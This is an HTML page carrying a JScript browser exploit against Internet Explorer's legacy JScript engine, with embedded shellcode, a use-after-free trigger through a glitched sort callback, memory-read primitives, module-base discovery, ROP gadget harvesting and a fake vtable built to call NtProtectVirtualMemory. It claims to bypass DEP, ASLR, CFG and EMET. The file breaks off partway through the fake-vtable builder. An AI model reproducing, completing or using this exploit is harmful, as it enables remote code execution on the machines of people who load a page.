<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

/*

Bypasses: DEP, ASLR, CFG, EMET (EAF, EAF+, stack pivot protection)

*/


var EnableDebug = 0;
var EnableTimers = 0;
var WindowsVersion = 7;
var Shellcode = [ 0x0004a164, 0x002d0000, 0x94000010, 0x68e58960, 0x00038f88, 0x00003ce8, 0xb81a6800, 0xe8500006, 0x0000007d, 0x7068646a, 0x89656e77, 0x656e68e1, 0x6f680074, 0x682e7272, 0x2d747365, 0x726f6668, 0x77776872, 0xe2892e77, 0x5152006a, 0xd0ff006a, 0x9461ec89, 0xe58955c3, 0x30be5657, 0x64000000, 0x0c408bad, 0x8918788b, 0xebc031fe, 0x74f73904, 0x74f68528, 0x245e8d24, 0x1474db85, 0x85044b8b, 0x6a0d74c9, 0x5de85101, 0x3b000001, 0x06740845, 0x368bc031, 0x468bd7eb, 0x895f5e10, 0x04c25dec, 0xe5895500, 0x0230ec81, 0x458b0000, 0xf8458908, 0x03f8558b, 0xc0833c42, 0xf0458904, 0x8914c083, 0xc289f445, 0x0308458b, 0x4a8b6042, 0xd04d8964, 0x89fc4589, 0x08458bc2, 0x89204203, 0x558bec45, 0x08458bfc, 0x89244203, 0x558be445, 0x08458bfc, 0x891c4203, 0xc031e845, 0x89e04589, 0x458bd845, 0x18408bfc, 0x0fe0453b, 0x0000d286, 0xe0458b00, 0x00850c8d, 0x8b000000, 0x458bec55, 0x11040308, 0x6ad44589, 0xbde85000, 0x3b000000, 0x850f0c45, 0x000000a1, 0x8de0458b, 0x458b0014, 0x04b70fe4, 0x850c8d02, 0x00000000, 0x8be8558b, 0x04030845, 0xd8458911, 0x89fc4d8b, 0xd05503ca, 0x7f7cc839, 0x7b7dd039, 0x00d845c7, 0x31000000, 0xd09d8dc9, 0x8afffffd, 0xfa800814, 0x80207400, 0x15752efa, 0x642e03c7, 0xc3836c6c, 0x0003c604, 0xfed09d8d, 0xeb41ffff, 0x411388de, 0xc6d8eb43, 0x9d8d0003, 0xfffffdd0, 0xe853006a, 0x0000003c, 0xfea3e850, 0xc085ffff, 0x45892974, 0x8d006adc, 0xfffed095, 0x21e852ff, 0x50000000, 0xe8dc75ff, 0xfffffed1, 0xebd84589, 0xe0458d0a, 0x1fe900ff, 0x8bffffff, 0xec89d845, 0x0008c25d, 0x57e58955, 0x8b084d8b, 0xdb310c7d, 0x74003980, 0x01b60f14, 0xb60f600c, 0xd1d301d0, 0xff8541e3, 0xeb41ea74, 0x5fd889e7, 0xc25dec89, 0x00650008, ];
var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 100 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 20000; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method
var ReClaimNameList = ReClaimIndexNameList;

var TimeStart;
var ReadCount;

function StartTimer() {
	ReadCount = 0;
	TimeStart = new Date().getTime();
}

function EndTimer(Message) {
	var TotalTime = (new Date().getTime() - TimeStart);
	if(EnableTimers) {
		//alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
		console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
	}
}

function GlitchedSort(untracked_1, untracked_2) { // goes to depth of 227 before freeing GcBlocks, which only happens once.
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth > 150) {
        VarSpray = new Array(); // Erase VarSpray
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(379).join('A');

function ReClaimIndexNameList(AnchorIndex, Value, PropertyName) {
    CollectGarbage(); // Cleanup
    AnchorObjectsBackup[AnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[AnchorIndex] = new Object();
    AnchorObjectsBackup[AnchorIndex][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
    AnchorObjectsBackup[AnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[AnchorIndex]["\u0003"] = 1;
    AnchorObjectsBackup[AnchorIndex][PropertyName] = Value; // The mutable variable
	ReadCount++;
}

// Different strategy is possible here: repeatedly wipe the specific anchor index and attempt to re-claim it: verifying this was successful could be done by passing the intended new VAR value to this function, and then checking if the mutable var value is equal to this value after every re-claim attempt.
function ReClaimBackupNameLists(AnchorIndex, Value, PropertyName) { // This function is assuming the leaked anchor index is within the range being freed/re-allocated
    CollectGarbage(); // Cleanup
    for(i = 0; i < NameListAnchorCount; i++) AnchorObjectsBackup[i] = null;//NameListAnchorCount
    CollectGarbage(); // Free the leaked NameList
    
    for(i = 0; i < NameListAnchorCount; i++) {
        AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0003"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
}

function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00,
          ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF,
          NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
   return String.fromCharCode.apply(null, Data);
}

var MutableVar;

function LeakByte(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LeakDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
}

function DiveModuleBase(Address) {
    var Base = (Address & 0xFFFF0000) + 0x4e; // Set to starting search point
    
    while(true) {
		if(LeakWord(Base) == 0x6854) { // 'hT'
			if(LeakWord(Base + 2) == 0x7369) { // 'si'
				return (Base - 0x4E);
			}
		}
        
        Base -= 0x10000;
    }
    
    return 0;
}

function Exploit() {
    // Initialization
    
	if(WindowsVersion == 8.1) {
		ReClaimNameList = ReClaimBackupNameLists;
	}
	
	StartTimer();

    for(i = 0; i < 310; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method
    var LFHBlocks = new Array();

    // Trigger LFH for a size of 0x648

    for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
    
	EndTimer("LFH");
	
    // New set of untracked vars in freed GcBlock
    
	StartTimer();
	
    NewUntrackedVarSet(); // Consistently 460 total
    DebugLog("total untracked: " + UntrackedVarSet.length.toString(10));
    // Re-claim with type confusion NameLists
    
    for(i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
	EndTimer("UntrackedVarSet - 1");
	StartTimer();
	
    // Leak final VVAL address from one of the NameLists
    
    AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    
	EndTimer("Anchor backup");
	StartTimer();
	
    var LeakedVvalAddress = 0;
    
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
            break;
        }
    }

	EndTimer("VAR scan - 1");
	
    if(LeakedVvalAddress != 0) {
        DebugLog("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
        var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

        for(i=0; i < 46; i++) {
            PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0);
        }
        
        while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

        // New set of untracked vars in freed GcBlock
        
		StartTimer();
        NewUntrackedVarSet();
        
        // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
        
        for(i = 0; i < NameListAnchorCount; i++) {
            NameListAnchors[i][PrimaryVvalPropName] = 1;
        }
        
		EndTimer("UntrackedVarSet - 2");
		StartTimer();
		
        // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
        
        var LeakedVvalVar;

        for(i = 0; i < UntrackedVarSet.length; i++) {
            if(typeof UntrackedVarSet[i] === "number") {
                LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
                LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
                break;
            }
        }
        
        DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
        
        // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
        
        ReClaimNameList(LeakedAnchorIndex, 0x11, "A");
        
        if(LeakedVvalVar + "" == 0x11) {
			EndTimer("VAR scan 2");
            DebugLog("Leaked anchor object re-claim verification success");
            // Create the mutable variable which will be used throughout the remainder of the exploit
        
            ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x22, 0));
            
            var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

            for(i=0; i < 46; i++) {
                PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); // +0x30 is the offset to property name field of 32-bit VVAL struct
            }
            
            while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a
            
            // New set of untracked vars in freed GcBlock
            
			StartTimer();
            NewUntrackedVarSet();
            
            // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
            
            for(i = 0; i < NameListAnchorCount; i++) {
                NameListAnchors[i][PrimaryVvalPropName] = 1;
            }
			
			EndTimer("UntrackedVarSet - 3");
			StartTimer();
			
            for(i = 0; i < UntrackedVarSet.length; i++) {
                if(typeof UntrackedVarSet[i] === "number") {
                    if(UntrackedVarSet[i] + "" == 0x22) {
                        MutableVar = UntrackedVarSet[i];
                        break;
                    }
                }
            }
            
            // Verify the mutable var can be changed via simple re-claim
            
            ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x33, 0));
            
            if(MutableVar + "" == 0x33) {
				// Test arbitrary read primitive
				
				EndTimer("VAR scan 3");
				DebugLog("Verified mutable variable modification via re-claim");
				
				if(LeakByte(LeakedVvalAddress + 0x30) == 0x8) { // Change mutable var to a BSTR pointing at itself.
					// Derive jscript.dll base from leaked Object vtable
				
					DebugLog("Memory leak test successful");
					StartTimer();
					
					var DissectedObj = new Object();
					var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, DissectedObj);
					var VtableAddress = LeakDword(ObjectAddress);
					
					DebugLog("Leaked vtable address: " + VtableAddress.toString(16));
					
					var JScriptBase = DiveModuleBase(VtableAddress);
					
					if(JScriptBase != 0) {
						EndTimer("JScriptBase base leak");
						// Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
						
						DebugLog("Leaked JScript base address: " + JScriptBase.toString(16));
						
						StartTimer();
						//var VirtualProtectAddress = ResolveImport(JScriptBase, 0x4e52454b, 0x32334c45, 0x74726956, 0x506c6175, 0);
						var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, 0x4e52454b, 0x32334c45);
						
						if(Kernel32ImportX != 0) {
							EndTimer("Kernel32 random import leak");
							StartTimer();
							//DebugLog("Successfully resolved VirtualProtect at 0x" + VirtualProtectAddress.toString(16));
							
							var Kernel32Base = DiveModuleBase(Kernel32ImportX);
							
							if(Kernel32Base != 0) {
								EndTimer("Kernel32Base base dive");
								DebugLog("Successfully resolved kernel32.dll base at 0x" + Kernel32Base.toString(16));

								StartTimer();
								var HintIndex = 0; // Windows 7 x64
								
								if(WindowsVersion == 7) {
									HintIndex = 141;
								}
								else if(WindowsVersion == 8.1) {
									HintIndex = 84;
								}
// NtProtoectVirtualMemry IAT index in kernel32 is much less in Win8.1 (130 works in Win7)
								var NtProtectAddress = ResolveImport(Kernel32Base, HintIndex, 0x6c64746e, 0x6c642e6c, 0x7250744e, 0x6365746f, 0); // 'rPtN' 'ceto'
								
								if(NtProtectAddress != 0) {
									EndTimer("NtProtoectVirtualMemry resolution");
									DebugLog("Successfully resolved NtProtoectVirtualMemry address from kernel32.dll IAT: " + NtProtectAddress.toString(16));

									StartTimer();
									var MsvcrtImportX = ExtractBaseFromImports(JScriptBase, 0x6376736d, 0x642e7472);
									var MsvcrtBase = DiveModuleBase(MsvcrtImportX);
									EndTimer("MsvcrtBase base leak");
									StartTimer();
									var RopGadgetSet = ResolveGadgetSet(MsvcrtBase);
									EndTimer("ROP gadget resolution");
									//RopGadgetSet.StackPivot= Number(0x82867) + MsvcrtBase;
									
									StartTimer();
									var NtProtectProxyStubAddress = ResolveNtProtectProxyStub(NtProtectAddress, 0x100);
									EndTimer("ResolveNtProtectProxyStub");
									
									if(NtProtectProxyStubAddress != 0) {
										StartTimer();
										var ShellcodeStr = TableToUnicode(Shellcode);
										var ShellcodeLen = (ShellcodeStr.length * 2);

										ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length);
										
										var WritableStr = "";
										var ShellcodeAddress = LeakObjectAddress(LeakedVvalAddress, ShellcodeStr);
										
										DebugLog("Shellcode length: 0x" + ShellcodeLen.toString(16));
										WritableStr += ConvertDwordArrayToBytes([0]);
										WritableStr += ConvertDwordArrayToBytes([ShellcodeAddress]);
										WritableStr += ConvertDwordArrayToBytes([ShellcodeLen]);
										WritableStr += ConvertDwordArrayToBytes([0]);
										WritableStr = WritableStr.substr(0, WritableStr.length);
										var WritableAddress = LeakObjectAddress(LeakedVvalAddress, WritableStr);
									   
									    var FakeVtablePaddingSize = 0x10000; // 64KB should be plenty to accomodate stack usage within NtProtectVirtualMemory and within shellcode (if it does not stack pivot on its own)
										var FakeVtable = CreateFakeVtable(FakeVtablePaddingSize, 0x200, NtProtectProxyStubAddress, ShellcodeAddress, RopGadgetSet, WritableAddress); // Doing this in a separate function is crucial for the AddressOf primitive to work properly. Concatenated vars in the same scope end up as a linked list of VARs
										//var FakeVtable = TempVtableTest(FakeVtablePaddingSize, 0x400, RopGadgetSet);
										
										DebugLog("ShellcodeAddress address: " + ShellcodeAddress.toString(16));
										
										FakeVtable = FakeVtable.substr(0, FakeVtable.length); // Nice trick to fix the AddressOf primitive. VARs created with multiple concats of other VARs end up as a linked list of VARs
										
										// VAR in VVAL will be a type 0x80 to a type 0x81 VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll
										
										// Re-claim NameList with mutable var set to region AFTER its own VAR in property name (as type 0x81). At this location in property name (+8 because of Type from generated VAR) the "object pointer" of the additional VAR (the fake vtable address) should be pointing at fake vtable BSTR +4 (to skip length
										
										var FakeVtableAddress = (LeakObjectAddress(LeakedVvalAddress, FakeVtable) + FakeVtablePaddingSize);
										EndTimer("Building shellcode, fake vtable, writable objects");
										DebugLog("fake vtable address: " + FakeVtableAddress.toString(16));

										ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar32(0, FakeVtableAddress, 0)); // Must be 0x81 not 0x80
										
										//alert("Executing stack pivot for DEP bypass at " + RopGadgetSet.StackPivot.toString(16));
										typeof MutableVar;
										alert("really done");
									}
									else {
										alert("Failed to resolve NtProtoectVirtualMemry proxy stub via opcode scan");
									}
								}
								else {
									DebugLog("Failed to resolve NtProtoectVirtualMemry from kernel32.dll IAT");
								}
							}
							else {
								DebugLog("Failed to identify Kernel32.dll base address via import " + Kernel32ImportX.toString(16));
							}
						}
						else {
							DebugLog("Failed to identify raandom kernel32.dll import address from JScript.dll IAT");
						}
					}
					else {
						DebugLog("Failed to leak JScript.dll base address");
					}
				}
				else {
					DebugLog("Memory leak test failed");
				}
            }
            else {
                DebugLog("Failed to verify mutable variable modification via re-claim");
            }
        }
        else {
            DebugLog("Failed to extract final VVAL index via re-claim");
        }
    }
    else {
        DebugLog("Leaked anchor object type confusion re-claim failed");
    }
}

function DebugLog(Message) {
    if(EnableDebug) { // Switch is below
        //alert(Message);
        console.log(Message); // In IE, console only works if devtools is open.
    }
}

function HarvestGadget(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
    var MaxHighOffset = (HintExportAddress + MagicOffset + MaxDelta);
	var MinLowOffset = ((HintExportAddress + MagicOffset) - MaxDelta);
    var LeakAddress = HintExportAddress + MagicOffset;
	var LeakFunc = LeakDword; // In nthe event a 0x00FFFFFF mask is used, LeakDword will be used, but will still be filtered
	
	if(MinLowOffset < HintExportAddress) {
		MinLowOffset = HintExportAddress;
	}
	
	DebugLog("Hunting for gadget 0x" + Data.toString(16) + " betwee 0x" + MinLowOffset.toString(16) + " and 0x" + MaxHighOffset.toString(16) + " starting from 0x" + LeakAddress.toString(16));
	
	if(DataMask == 0x0000FFFF) {
		LeakFunc = LeakWord;
	}
	else {
		alert("Unhaandled data mask for gadget harvest");
		return 0;
	}
    
    if((LeakFunc(LeakAddress) & DataMask) == Data) {
        DebugLog("Found gadget at expected delta of " + MagicOffset.toString(16));
    }
    else {
		var HighAddress = (LeakAddress + 1);
		var LowAddress = LeakAddress - 1;

        LeakAddress = 0;

        while(LowAddress >= MinLowOffset || HighAddress < MaxHighOffset) {
			if(LowAddress >= MinLowOffset) {
				if((LeakFunc(LowAddress) & DataMask) == Data) {
					DebugLog("Found gadget from scan below magic at " + LowAddress.toString(16));
					LeakAddress = LowAddress;
					break;
				}
				
				LowAddress -= 1;
			}
			
			if(HighAddress < MaxHighOffset) {
				if((LeakFunc(HighAddress) & DataMask) == Data) {
					DebugLog("Found gadget from scan above magic at " + HighAddress.toString(16));
					LeakAddress = HighAddress;
					break;
				}
				
				HighAddress += 1;
			}
        }
    }
    
    return LeakAddress;
}

function ResolveNtProtectProxyStub(ScanAddress, MaxOffset) {
	/*
	7725001A | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
	77250021 | 83C4 04                  | add esp,4                               |
	77250024 | C2 0800                  | ret 8                                   |
	77250027 | 90                       | nop                                     |
	77250028 | E9 BB0857BF              | jmp 367C08E8                            | <- NtProtectVirtualMemory
	7725002D | CC                       | int3                                    |
	7725002E | CC                       | int3                                    |
	7725002F | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
	77250033 | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
	7725003A | 83C4 04                  | add esp,4                               |
	7725003D | C2 1400                  | ret 14                                  |
	77250040 | B8 4E000000              | mov eax,4E                              | 4E:'N'
	77250045 | 33C9                     | xor ecx,ecx                             |
	77250047 | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
	7725004B | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
	77250052 | 83C4 04                  | add esp,4                               |
	77250055 | C2 1400                  | ret 14                                  |
	*/
	
	var Offset = 0;
	var LastMovEaxAddress = 0;
	var ProxyStubAddress = 0;
	var RetnScenarioOne = 0;
	var RetnScenarioTwo = 0;
	
	// Scan forward searching for 0xB8 opcode. Once one is found, scan forward until 0xC2 0x14 0x00 is found.
	// Proxy stub address will be the address of the last 0xB8 opcode +5.
	
	while(Offset < MaxOffset) {
		var LeakAddress = ScanAddress + Offset;
		var LeakedWord = LeakWord(LeakAddress);
		var ByteOne = (LeakedWord & 0x00FF);
		var ByteTwo = ((LeakedWord & 0xFF00) >> 8);
		
		if(ByteOne == 0xB8) {
			LastMovEaxAddress = LeakAddress;
		}
		else if(ByteTwo == 0xB8) {
			LastMovEaxAddress = (LeakAddress + 1);
		}
		
		/*
		Scenario one:
		
			Byte one = 0xc2
			Byte two = 0x14
		
		Next:
		
			Byte one = 0x00
		
		--
		
		Scenario two:
		
			Byte two - 0xC2
		
		Next:
		
			Byte one - 0x14
			Byte two - 0x00
		*/
		
		else if(LastMovEaxAddress != 0) {
			if(!RetnScenarioOne) {
				if(ByteOne == 0xc2 && ByteTwo == 0x14) {
					RetnScenarioOne = 1;
				}
			}
			else {
				if(ByteOne == 0x00) {
					ProxyStubAddress = (LastMovEaxAddress + 5);
					DebugLog("NtProtectVirtualMemory proxy stub scenario one scan success: 0x" + ProxyStubAddress.toString(16));
					break;
				}
				else {
					RetnScenarioOne = 0;
				}
			}
			
			if(!RetnScenarioTwo) {
				if(ByteTwo == 0xC2) {
					RetnScenarioTwo = 1;
				}
			}
			else {
				if(ByteOne == 0x14 && ByteTwo == 0x00) {
					ProxyStubAddress = (LastMovEaxAddress + 5);
					DebugLog("NtProtectVirtualMemory proxy stub scenario two scan success: 0x" + ProxyStubAddress.toString(16));
					break;
				}
				else {
					RetnScenarioTwo = 0;
				}
			}
		}
		
		Offset += 2;
	}
	
	return ProxyStubAddress;
}

////////
// Dynamically resolve gadget addresses via delta from export addresses
// MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+

function ResolveGadgetSet(MsvcrtBase) {
    var GadgetSetObj = new Object();
    //EnableDebug = 1;
	
    DebugLog("Dynamically resolving ROP gadget addresses from MSVCRT.DLL export address hints from base " + MsvcrtBase.toString(16));
    
    // XCHG EAX, ESP; RET
    // For Win7:
    // __libm_sse2_log10:0x0008dc45 (+0x4f0) <- 0x0008e135 -> (+0x670) __libm_sse2_log10f:0x0008e7a5
    //For Win8.1: 
    //__libm_sse2_log10:0x000a9b80 (+0x4e5) <- 0x000aa065 -> (+0x67b) __libm_sse2_log10f:0x000aa6e0

    // Due to binary search of EAT, it cannot be assumed that __libm_sse2_log10 will be checked prior to __libm_sse2_log10f
    var ExportPair = ResolveExport(MsvcrtBase, [0x696c5f5f, 0x735f6d62, 0x5f326573, 0x31676f6c, 0x00000030]); // 'il__' 's_mb' '_2es' '1gol' '0'
	var StackPivotHint = ExportPair[0];
    DebugLog("Stack pivot hint: " + StackPivotHint.toString(16) + " EAT index: " + ExportPair[1].toString(10));
	var MagicOffset = 0x4f0; // Win7
	
	if(WindowsVersion == 8.1) {
		MagicOffset = 0x4e5;
	}
	
    GadgetSetObj.StackPivot = HarvestGadget(StackPivotHint, 0x100, 0xc394, 0x0000FFFF, MagicOffset);
    
    if(GadgetSetObj.StackPivot != 0) {
        DebugLog("Stack pivot resolved to: " + GadgetSetObj.StackPivot.toString(16));
        GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);
        
        
        // POP EAX; RET
        // Win7/8 (+0x13 and same export on both)
        // _safe_fdivr:0x00031821 (+0x13) <- 0x00031834 -> (+0x208) _adj_fprem:0x00031a3c
		
		// POP ECX; RET
		// Win7/8.1 same delta (0x7)
		// _flushall:0x0001364f (+0x7) <- 0x00013656 -> (+0x54) exit:0x000136aa
		
		//EnableDebug = 1;

		var ExportPair = ResolveExport(MsvcrtBase, [0x6661735f, 0x64665f65, 0x00727669]); // 'fas_' 'df_e' 'rvi'
		var PopEaxHint = ExportPair[0];
		DebugLog("POP EAX hint: " + PopEaxHint.toString(16) + " EAT index: " + ExportPair[1].toString(10));

		GadgetSetObj.PopEax = HarvestGadget(PopEaxHint, 0x100, 0xc358, 0x0000FFFF, 0x00000013); // Win7/8.1 have same offset
		
		var ExportPair = ResolveExport(MsvcrtBase, [0x756c665f, 0x6c616873, 0x0000006C]); // 'ulf_' 'lahs' 'l'
		var PopEcxHint = ExportPair[0];
		GadgetSetObj.PopEcx = HarvestGadget(PopEcxHint, 0x100, 0xc359, 0x0000FFFF, 0x00000007); // Win7/8.1 have same offset
		DebugLog("POP ECX hint: " + GadgetSetObj.PopEcx.toString(16) + " EAT index: " + ExportPair[1].toString(10));
    }
    
    return GadgetSetObj;
}

function TempVtableTest(FakeVtablePaddingSize, VtableSize, RopGadgetSet) {
    var FakeVtable = "";
    var X = 0;
    var Y = 0;
    var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);

    DebugLog("Final stack pivot for vtable at " + RopGadgetSet.StackPivot.toString(16));
    
    while (FakeVtable.length < TotalObjLen) {
        if(X < FakeVtablePaddingSize) {
            FakeVtable += ConvertDwordArrayToBytes([0x11111111]);
        }
        else {
            if(Y == 0x9c) {
                FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
            }
            else if(Y == 0x98) {
                //FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEcx]);
            }
            else {
                //FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]);
            }
            
            Y += 4;
        }
        
        X += 4;
    }
	return FakeVtable;
}

function CreateFakeVtable(FakeVtablePaddingSize, VtableSize, NtProtectAddress, ShellcodeAddress, RopGadgetSet, WritableAddress) {
    // NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect); 
    // [Padding]
    // [ROPNOP sled]
    // [Stack alignment gadget]
    // [Stack pivot]
    // [Set EAX to 0x4D]
    // [NtProtoectVirtualMemry]
    // [Shellcode address] <- NtProtoectVirtualMemry return
    // [NtProtoectVirtualMemry parameters]
    // [Stack pivot]
    // [Padding]
    
    var FakeVtable = "";
    var X = 0;
    var Y = 0;
	var PaddingArrayLen = FakeVtablePaddingSize / 4;
    var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
	var PaddingArray = [];

	for(i = 0; i < PaddingArrayLen; i++) {
		PaddingArray[i] = 0x11111111;
	}
	
	FakeVtable += ConvertDwordArrayToBytes(PaddingArray);
	
    DebugLog("Final stack pivot for vtable at " + RopGadgetSet.StackPivot.toString(16));
    
    while (FakeVtable.length < TotalObjLen) {
		if(Y == 0x9c) {
			FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
		}
		else if(Y == 0x98) {
			FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEcx]);
		}
		else {
			FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]);
		}
		
		Y += 4;
    }
    
    // Layout of storage address region
    // +0x0 | Original ESP
    // +0x4 | Shellcode address
    // +0x8 | Shellcode size
    // +0xC | Old protection
    
    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
	
